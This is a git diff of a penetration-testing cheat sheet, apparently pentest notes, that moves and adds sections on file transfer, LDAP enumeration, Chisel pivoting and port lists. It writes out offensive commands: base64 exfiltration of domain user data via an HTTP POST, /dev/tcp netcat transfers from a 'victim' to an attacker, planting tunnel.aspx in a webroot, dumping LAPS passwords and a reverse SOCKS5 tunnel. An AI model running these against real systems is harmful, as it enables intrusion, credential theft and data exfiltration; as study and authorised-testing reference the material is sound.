@@ -149,6 +149,68 @@ user@remote:$ export TERM=xterm
 
 
 
+## File Transfer
+
+
+
+### Linux
+
+* [snovvcrash.rocks/2018/10/11/simple-http-servers.html](https://snovvcrash.rocks/2018/10/11/simple-http-servers.html)
+
+
+
+### Windows
+
+Local file to base64:
+
+```
+Cmd> certutil -encode <FILE_TO_ENCODE> C:\Windows\Temp\encoded.b64
+Cmd> type C:\Windows\Temp\encoded.b64
+```
+
+Local string to base64 and POST:
+
+```
+PS> $str = cmd /c net user /domain
+PS> $base64str = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+PS> Invoke-RestMethod -Uri http://127.0.0.1/msg -Method POST -Body $base64str
+```
+
+
+
+### Linux2Linux
+
+```
+# Sender:
+root@kali:$ nc -w3 -lvnp 1234 < file.txt
+# Recepient:
+www-data@victim:$ bash -c 'cat < /dev/tcp/127.0.0.1/1234 > /tmp/.file'
+
+# Recepient:
+root@kali:$ nc -w3 -lvnp 1234 > file.txt
+# Sender:
+www-data@victim:$ bash -c 'cat < file.txt > /dev/tcp/127.0.0.1/1234'
+```
+
+
+
+### Linux2Windows
+
+* [blog.ropnop.com/transferring-files-from-kali-to-windows/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
+
+Full base64 file transfer from Linux to Windows:
+
+```
+root@kali:$ base64 -w0 tunnel.aspx; echo
+...BASE64_CONTENTS...
+PS> Add-Content -Encoding UTF8 tunnel.b64 "<BASE64_CONTENTS>" -NoNewLine
+PS > $data = Get-Content -Raw tunnel.b64
+PS > [IO.File]::WriteAllBytes("C:\inetpub\wwwroot\uploads\tunnel.aspx", [Convert]::FromBase64String($data))
+```
+
+
+
+
 ## VNC
 
 Decrypt TightVNC password:
@@ -297,38 +359,38 @@ root@kali:$ mount -t nfs 127.0.0.1:/home /mnt/nfs -v -o user=snovvcrash,[pass=qw
 Basic syntax:
 
 ```
-root@kali:$ ldapsearch -h 127.0.0.1 -D EXAMPLE.LOCAL -x -s <SCOPE> -b <BASE_DN> <QUERY> <FILTER> <FILTER> <FILTER>
+root@kali:$ ldapsearch -h 127.0.0.1 -x -s <SCOPE> -b <BASE_DN> <QUERY> <FILTER> <FILTER> <FILTER>
 ```
 
 Get base naming contexts:
 
 ```
-root@kali:$ ldapsearch -h 127.0.0.1 -D EXAMPLE.LOCAL -x -s base namingcontexts
+root@kali:$ ldapsearch -h 127.0.0.1 -x -s base namingcontexts
 ```
 
 Extract data for the whole domain catalog and then grep your way through:
 
 ```
-root@kali:$ ldapsearch -h 127.0.0.1 -D EXAMPLE.LOCAL -x -s sub -b "DC=example,DC=local" |tee ldap.out
+root@kali:$ ldapsearch -h 127.0.0.1 -x -s sub -b "DC=example,DC=local" |tee ldap.out
 root@kali:$ cat ldap.out |grep -i memberof
 ```
 
 Or filter out only what you need:
 
 ```
-root@kali:$ ldapsearch -h 127.0.0.1 -D EXAMPLE.LOCAL -x -b "DC=example,DC=local" '(objectClass=User)' sAMAccountName sAMAccountType
+root@kali:$ ldapsearch -h 127.0.0.1 -x -b "DC=example,DC=local" '(objectClass=User)' sAMAccountName sAMAccountType
 ```
 
 Get `Remote Management Users` group:
 
 ```
-root@kali:$ ldapsearch -h 127.0.0.1 -D EXAMPLE.LOCAL -x -b "DC=example,DC=local" '(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=example,DC=local)' |grep -i memberof
+root@kali:$ ldapsearch -h 127.0.0.1 -x -b "DC=example,DC=local" '(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=example,DC=local)' |grep -i memberof
 ```
 
 Dump LAPS passwords:
 
 ```
-root@kali:$ ldapsearch -h 127.0.0.1 -D EXAMPLE.LOCAL -x -b "dc=example,dc=local" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
+root@kali:$ ldapsearch -h 127.0.0.1 -x -b "dc=example,dc=local" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
 ```
 
 
@@ -1517,7 +1579,17 @@ PS> get-filehash -alg md5 chisel.exe
 PS> Start-Process -NoNewWindows chisel.exe client 127.0.0.1:8000 R:127.0.0.1:2222:127.0.0.1:1111
 ```
 
+Socks5 proxy with Chisel:
+
+```
+1. root@kali:$ ./chisel server -p 8000 -reverse
+2. user@victim:$ ./chisel client 10.14.14.5:8000 R:127.0.0.1:8001:127.0.0.1:8002 &
+3. user@victim:$ ./chisel server -v -p 8002 --socks5 &
+4. root@kali:$ ./chisel client 127.0.0.1:8001 1080:socks
+```
+
 1. [github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)
+2. [snovvcrash.rocks/2020/03/17/htb-reddish.html#chisel-socks](https://snovvcrash.rocks/2020/03/17/htb-reddish.html#chisel-socks)
 
 
 
@@ -1698,39 +1770,11 @@ PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogo
 2. [0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html](https://0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html)
 
 
-#### Tricks
-
-Local file to base64:
-
-```
-Cmd> certutil -encode <FILE_TO_ENCODE> C:\Windows\Temp\encoded.b64
-Cmd> type C:\Windows\Temp\encoded.b64
-```
-
-Local string to base64 and POST:
-
-```
-PS> $str = cmd /c net user /domain
-PS> $base64str = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
-PS> Invoke-RestMethod -Uri http://127.0.0.1/msg -Method POST -Body $base64str
-```
-
-Full base64 file transfer from Linux to Windows:
-
-```
-root@kali:$ base64 -w0 tunnel.aspx; echo
-...BASE64_CONTENTS...
-PS> Add-Content -Encoding UTF8 tunnel.b64 "<BASE64_CONTENTS>" -NoNewLine
-PS > $data = Get-Content -Raw tunnel.b64
-PS > [IO.File]::WriteAllBytes("C:\inetpub\wwwroot\uploads\tunnel.aspx", [Convert]::FromBase64String($data))
-```
-
-* [PayloadsAllTheThings/Windows - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
-
-
 
 
 ## PrivEsc
+
+* [PayloadsAllTheThings/Windows - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
 
 
@@ -2223,6 +2267,12 @@ root@kali:$ nmap -n -Pn --min-rate=1000 -T4 127.0.0.1 -p- -vvv | tee ports
 root@kali:$ ports=`cat ports | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
 root@kali:$ nmap -n -Pn -sV -sC [-sT] [--reason] -oA nmap/output 127.0.0.1 -p$ports
 root@kali:$ rm ports
+```
+
+Top Windows ports:
+
+```
+53,80,88,135,139,389,443,445,464,593,636,1433,3268,5985,5986
 ```
 
 Top UDP ports:
